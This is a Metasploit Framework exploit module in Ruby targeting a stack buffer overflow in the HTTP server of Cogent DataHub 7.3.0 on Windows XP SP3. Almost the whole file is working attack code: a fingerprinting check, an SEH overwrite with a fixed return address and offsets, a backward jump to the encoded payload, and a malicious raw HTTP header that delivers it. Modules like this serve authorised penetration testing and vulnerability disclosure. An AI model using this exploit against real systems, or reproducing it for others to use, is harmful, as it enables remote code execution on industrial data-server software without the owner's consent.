##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::Seh

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Cogent DataHub HTTP Server Buffer Overflow',
      'Description'    => %q{
        This module exploits a stack based buffer overflow on Cogent DataHub 7.3.0. The
        vulnerability exists in the HTTP server - while handling HTTP headers, a
        strncpy() function is used in a dangerous way. This module has been tested
        successfully on Cogent DataHub 7.3.0 (Demo) on Windows XP SP3.
      },
      'Author'         =>
        [
          'rgod <rgod[at]autistici.org>',  # Vulnerability discovery
          'juan vazquez', # Metasploit module
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'OSVDB', '95819'],
          [ 'BID', '53455'],
          [ 'URL', 'http://www.zerodayinitiative.com/advisories/ZDI-13-178' ],
          [ 'URL', 'http://www.cogentdatahub.com/Info/130712_ZDI-CAN-1915_Response.html']
        ],
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'process',
        },
      'Privileged'     => false,
      'Payload'        =>
        {
          'Space'       => 33692,
          'DisableNops' => true,
          'BadChars'    => "\x00\x0d\x0a\x3a"
        },
      'Platform'       => 'win',
      'Targets'        =>
        [
          # Tested with the Cogent DataHub 7.3.0 Demo
          # CogentDataHubV7.exe 7.3.0.70
          ['Windows XP SP3 English / Cogent DataHub 7.3.0',
            {
              'Ret'         => 0x7ffc070e, # ppr # from NLS tables # Tested stable over Windows XP SP3 updates
              'Offset'      => 33692,
              'CrashLength' => 4000 # In order to ensure crash before the stack cookie check
            }
          ],
        ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Jul 26 2013'
    ))

  end

  def check
    res = send_request_cgi({
      'uri'          => "/datahub.asp",
      'method'       => 'GET',
    })

    if res and res.code == 200 and res.body =~ /<title>DataHub - Web Data Browser<\/title>/
      return Exploit::CheckCode::Detected
    end

    return Exploit::CheckCode::Safe
  end

  def exploit
    print_status("Trying target #{target.name}...")

    off = target['Offset'] + 8 # 8 => length of the seh_record
    bof = payload.encoded
    bof << rand_text_alpha(target['Offset'] - payload.encoded.length)
    bof << generate_seh_record(target.ret)
    bof << Metasm::Shellcode.assemble(Metasm::Ia32.new, "jmp $-" + off.to_s).encode_string
    bof << rand_text(target['CrashLength'])

    print_status("Sending request to #{rhost}:#{rport}")

    send_request_cgi({
      'uri'          => "/",
      'method'       => 'GET',
      'raw_headers'  => "#{bof}: #{rand_text_alpha(20 + rand(20))}\r\n"
    })

  end
end
